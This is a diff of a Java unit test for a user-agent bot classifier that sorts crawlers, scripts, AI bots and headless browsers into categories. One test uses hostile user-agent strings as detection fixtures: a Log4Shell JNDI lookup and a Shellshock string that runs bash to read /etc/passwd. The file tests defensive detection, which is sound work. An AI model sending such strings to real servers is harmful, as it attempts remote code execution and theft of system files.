@@ -15,14 +15,14 @@ class UaTrafficClassifierTest {
     @Test
     void routesOnlyExplicitSignals() {
         SearchEngineIpSnapshot empty = SearchEngineIpSnapshot.empty();
-        assertFalse(classifier.classify("", "", "Unknown", "", "", rules, empty).isBot());
-        assertTrue(classifier.classify("", "", "", "", "", UaRuleSet.compile("^$", false), empty).isBot());
-        assertFalse(classifier.classify("Mozilla/5.0", "", "Desktop", "Chrome", "", rules, empty).isBot());
-        assertFalse(classifier.classify("Mozilla/5.0 SogouExplorer/1.0", "", "Desktop", "", "", rules, empty).isBot());
-        assertTrue(classifier.classify("python-requests/1.0", "", "", "", "", rules, empty).isBot());
-        assertTrue(classifier.classify("x", "", "Robot", "", "", rules, empty).isBot());
-        assertTrue(classifier.classify("HeadlessChrome/1.0", "", "", "", "", rules, empty).isBot());
-        TrafficDecision google = classifier.classify("Googlebot/2.1", "", "Robot", "", "", rules, empty);
+        assertFalse(classifier.classify("", "", "Unknown", "", rules, empty).isBot());
+        assertTrue(classifier.classify("", "", "", "", UaRuleSet.compile("^$", false), empty).isBot());
+        assertFalse(classifier.classify("Mozilla/5.0", "", "Desktop", "Chrome", rules, empty).isBot());
+        assertFalse(classifier.classify("Mozilla/5.0 SogouExplorer/1.0", "", "Desktop", "", rules, empty).isBot());
+        assertTrue(classifier.classify("python-requests/1.0", "", "", "", rules, empty).isBot());
+        assertTrue(classifier.classify("x", "", "Robot", "", rules, empty).isBot());
+        assertTrue(classifier.classify("HeadlessChrome/1.0", "", "", "", rules, empty).isBot());
+        TrafficDecision google = classifier.classify("Googlebot/2.1", "", "Robot", "", rules, empty);
         assertEquals(100, google.getBotScore());
         assertEquals("google", google.getSearchEngine());
         assertEquals("unverified", google.getVerificationStatus());
@@ -45,21 +45,82 @@ class UaTrafficClassifierTest {
                 {"Go-http-client/1.1", "GO"},
                 {"axios/1.6.2", "NODEJS"},
                 {"Typhoeus - https://github.com/typhoeus/typhoeus", "RUBY"},
-                {"Dart/3.2 (dart:io)", "DART"}};
+                {"Dart/3.2 (dart:io)", "DART"},
+                {"Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://www.ahrefs.com/robot/)", "SEO_TOOL"},
+                {"Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)", "SEO_TOOL"},
+                {"Twitterbot/1.0", "SOCIAL_PREVIEW"},
+                {"Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com)", "SOCIAL_PREVIEW"},
+                {"UptimeRobot/2.0 (uptimerobot.com)", "MONITOR_ARCHIVER"},
+                {"archive.org_bot wayback/1.0", "MONITOR_ARCHIVER"},
+                {"WordPress/6.4; https://www.wordpress.org", "PHP"},
+                {"GuzzleHttp/7.8", "PHP"},
+                {"Mozilla/5.0 (compatible; SemanticBot/1.0)", "GENERIC_BOT"},
+                {"spider-foot/1.0", "GENERIC_BOT"}};
         for (String[] script : scripts) {
             assertEquals(script[1], classifier.classifyScriptUa(script[0]), script[0]);
-            TrafficDecision decision = classifier.classify(script[0], "", "", "", "", "", rules, empty);
+            TrafficDecision decision = classifier.classify(script[0], "", "", "", "", rules, empty);
             assertTrue(decision.isBot(), script[0]);
             assertTrue(decision.getReasons().contains("ua_script"), script[0]);
+            assertEquals("script_crawler", decision.getBotCategory(), script[0]);
+            assertEquals(script[1], decision.getBotSubcategory(), script[0]);
             assertEquals("", decision.getSearchEngine(), script[0]);
             assertEquals("not_applicable", decision.getAiVerificationStatus(), script[0]);
         }
         assertEquals("EMPTY_UA", classifier.classifyScriptUa(""));
         assertEquals("UNKNOWN", classifier.classifyScriptUa("Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"));
         // 搜索引擎与 AI 声明优先于脚本规则，不叠加 ua_script
-        TrafficDecision google = classifier.classify("Googlebot/2.1", "", "", "", "", "", rules, empty);
+        TrafficDecision google = classifier.classify("Googlebot/2.1", "", "", "", "", rules, empty);
         assertFalse(google.getReasons().contains("ua_script"));
         assertTrue(google.getReasons().contains("search_engine_ua"));
+    }
+
+    @Test
+    void classifiesBotCategoryAndSubcategory() {
+        UaRuleSet noRules = UaRuleSet.compile("", false);
+        // AI 爬虫
+        TrafficDecision gpt = classifier.classify(
+                "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko); compatible; GPTBot/1.1", "", "", "", "", noRules, SearchEngineIpSnapshot.empty());
+        assertEquals("ai_crawler", gpt.getBotCategory());
+        assertEquals("openai", gpt.getBotSubcategory());
+        // 搜索引擎
+        TrafficDecision google = classifier.classify("Googlebot/2.1", "", "", "", "", rules, SearchEngineIpSnapshot.empty());
+        assertEquals("search_engine", google.getBotCategory());
+        assertEquals("google", google.getBotSubcategory());
+        // 无头浏览器：Chrome 无头与 AI 专用无头
+        TrafficDecision headless = classifier.classify(
+                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/120.0.0.0 Safari/537.36",
+                "", "", "", "", rules, SearchEngineIpSnapshot.empty());
+        assertEquals("headless_browser", headless.getBotCategory());
+        assertEquals("headless_chrome", headless.getBotSubcategory());
+        TrafficDecision lightpanda = classifier.classify("Lightpanda/1.0", "", "", "", "", noRules, SearchEngineIpSnapshot.empty());
+        assertEquals("headless_browser", lightpanda.getBotCategory());
+        assertEquals("lightpanda", lightpanda.getBotSubcategory());
+        // 攻击载荷：Log4Shell、Shellshock、CVE 探针
+        TrafficDecision jndi = classifier.classify("${jndi:ldap://${:-378}.${hostName}.useragent.db}", "", "", "", "", rules, SearchEngineIpSnapshot.empty());
+        assertTrue(jndi.isBot());
+        assertTrue(jndi.getReasons().contains("ua_attack_payload"));
+        assertEquals("other", jndi.getBotCategory());
+        assertEquals("attack_payload", jndi.getBotSubcategory());
+        assertEquals("attack_payload", classifier.classify("() { :; }; echo ; /bin/bash -c 'cat /etc/passwd'", "", "", "", "", rules, SearchEngineIpSnapshot.empty()).getBotSubcategory());
+        assertEquals("attack_payload", classifier.classify("cve-2026-63030/1.0", "", "", "", "", rules, SearchEngineIpSnapshot.empty()).getBotSubcategory());
+        // 其他类兜底：伪装、黑客、未分类机器人、仅黑名单
+        assertEquals("robot_unknown", classifier.classify("example", "", "Robot", "", "", rules, SearchEngineIpSnapshot.empty()).getBotSubcategory());
+        assertEquals("robot_imitator", classifier.classify("example", "", "Robot Imitator", "", "", rules, SearchEngineIpSnapshot.empty()).getBotSubcategory());
+        assertEquals("hacker", classifier.classify("example", "", "Hacker", "", "", rules, SearchEngineIpSnapshot.empty()).getBotSubcategory());
+        assertEquals("blacklist", classifier.classify("", "", "", "", "", UaRuleSet.compile("^$", false), SearchEngineIpSnapshot.empty()).getBotSubcategory());
+        // 攻击载荷优先于设备机器人信号
+        assertEquals("other", classifier.classify("${jndi:ldap://x}", "", "Robot", "", "", rules, SearchEngineIpSnapshot.empty()).getBotCategory());
+        assertEquals("attack_payload", classifier.classify("${jndi:ldap://x}", "", "Robot", "", "", rules, SearchEngineIpSnapshot.empty()).getBotSubcategory());
+        // 普通流量不分类
+        TrafficDecision human = classifier.classify(
+                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+                "", "Desktop", "Browser", "Chrome", rules, SearchEngineIpSnapshot.empty());
+        assertFalse(human.isBot());
+        assertEquals("", human.getBotCategory());
+        assertEquals("", human.getBotSubcategory());
+        // 报告特例：浏览器预取与 Android 应用直连保持普通流量
+        assertFalse(classifier.classify("Chrome Privacy Preserving Prefetch Proxy", "", "", "", "", rules, SearchEngineIpSnapshot.empty()).isBot());
+        assertFalse(classifier.classify("Dalvik/2.1.0 (Linux; U; Android 9.0; ZTE BA520 Build/MRA58K)", "", "", "", "", rules, SearchEngineIpSnapshot.empty()).isBot());
     }
 
     @Test
@@ -94,7 +155,7 @@ class UaTrafficClassifierTest {
                 {"Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot; +https://webmaster.petalsearch.com/site/petalbot)", "huawei"},
                 {"Mozilla/5.0 (compatible; Bravebot/1.0; +https://brave.com/search)", "brave"}};
         for (String[] engine : engines) {
-            TrafficDecision decision = classifier.classify(engine[0], "", "", "", "", "", rules, empty);
+            TrafficDecision decision = classifier.classify(engine[0], "", "", "", "", rules, empty);
             assertEquals(engine[1], decision.getSearchEngine(), engine[0]);
             assertTrue(decision.getReasons().contains("search_engine_ua"), engine[0]);
             assertEquals("not_applicable", decision.getAiVerificationStatus(), engine[0]);
@@ -111,7 +172,7 @@ class UaTrafficClassifierTest {
 
         TrafficDecision gpt = classifier.classify(
                 "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko); compatible; GPTBot/1.1; +https://openai.com/gptbot",
-                "192.0.2.1", "", "", "", "", noRules, library);
+                "192.0.2.1", "", "", "", noRules, library);
         assertEquals(Collections.singletonList("ua_ai_crawler"), gpt.getReasons());
         assertEquals("", gpt.getSearchEngine());
         assertEquals("not_applicable", gpt.getVerificationStatus());
@@ -120,7 +181,7 @@ class UaTrafficClassifierTest {
         // AI 特征先于搜索引擎匹配：Applebot-Extended 包含 Applebot，仍归 AI 来源
         TrafficDecision appleExt = classifier.classify(
                 "Mozilla/5.0 (compatible; Applebot-Extended/1.0; +https://support.apple.com/applebot)",
-                "192.0.2.1", "", "", "", "", noRules, empty);
+                "192.0.2.1", "", "", "", noRules, empty);
         assertEquals(Collections.singletonList("ua_ai_crawler"), appleExt.getReasons());
         assertEquals("", appleExt.getSearchEngine());
         assertEquals("unverified", appleExt.getAiVerificationStatus());
@@ -128,7 +189,7 @@ class UaTrafficClassifierTest {
         // 字节爬虫由搜索引擎迁移至 AI 来源
         TrafficDecision bytespider = classifier.classify(
                 "Mozilla/5.0 (compatible; Bytespider; https://zhanzhang.toutiao.com/)",
-                "192.0.2.1", "", "", "", "", noRules, empty);
+                "192.0.2.1", "", "", "", noRules, empty);
         assertEquals(Collections.singletonList("ua_ai_crawler"), bytespider.getReasons());
         assertEquals("", bytespider.getSearchEngine());
         assertEquals("unverified", bytespider.getAiVerificationStatus());
@@ -136,7 +197,7 @@ class UaTrafficClassifierTest {
         // DuckAssistBot 归 DuckDuckGo AI 来源，不进搜索引擎分类
         TrafficDecision duckAssist = classifier.classify(
                 "DuckAssistBot/1.2; (+http://duckduckgo.com/duckassistbot.html)",
-                "192.0.2.1", "", "", "", "", noRules, empty);
+                "192.0.2.1", "", "", "", noRules, empty);
         assertEquals(Collections.singletonList("ua_ai_crawler"), duckAssist.getReasons());
         assertEquals("", duckAssist.getSearchEngine());
         assertEquals("unverified", duckAssist.getAiVerificationStatus());
@@ -146,23 +207,23 @@ class UaTrafficClassifierTest {
     void recognizesAgentAndDeviceRobotClasses() {
         SearchEngineIpSnapshot empty = SearchEngineIpSnapshot.empty();
         for (String agentClass : Arrays.asList("Robot", "Robot Mobile")) {
-            TrafficDecision result = classifier.classify("example", "", "Desktop", agentClass, "", "", rules, empty);
+            TrafficDecision result = classifier.classify("example", "", "Desktop", agentClass, "", rules, empty);
             assertTrue(result.isBot(), agentClass);
             assertEquals(Collections.singletonList("ua_agent_class"), result.getReasons());
             assertEquals("Desktop", result.getDeviceClass());
         }
         for (String deviceClass : Arrays.asList("Robot", "Robot Mobile", "Robot Imitator", "Hacker")) {
-            TrafficDecision result = classifier.classify("example", "", deviceClass, "Browser", "", "", rules, empty);
+            TrafficDecision result = classifier.classify("example", "", deviceClass, "Browser", "", rules, empty);
             assertTrue(result.isBot(), deviceClass);
             assertEquals(Collections.singletonList("ua_device_class"), result.getReasons());
             assertEquals(deviceClass, result.getDeviceClass());
         }
-        TrafficDecision combined = classifier.classify("example", "", "Robot Mobile", "Robot", "", "", rules, empty);
+        TrafficDecision combined = classifier.classify("example", "", "Robot Mobile", "Robot", "", rules, empty);
         assertEquals(Arrays.asList("ua_device_class", "ua_agent_class"), combined.getReasons());
-        assertFalse(classifier.classify("example", "", null, null, "", "", rules, empty).isBot());
-        assertFalse(classifier.classify("example", "", "Desktop", "Browser", "", "", rules, empty).isBot());
-        assertFalse(classifier.classify("example", "", "Desktop", "Robot Imitator", "", "", rules, empty).isBot());
-        assertTrue(classifier.classify("example", "", "robot mobile", "browser", "", "", rules, empty).isBot());
+        assertFalse(classifier.classify("example", "", null, null, "", rules, empty).isBot());
+        assertFalse(classifier.classify("example", "", "Desktop", "Browser", "", rules, empty).isBot());
+        assertFalse(classifier.classify("example", "", "Desktop", "Robot Imitator", "", rules, empty).isBot());
+        assertTrue(classifier.classify("example", "", "robot mobile", "browser", "", rules, empty).isBot());
     }
 
     @Test
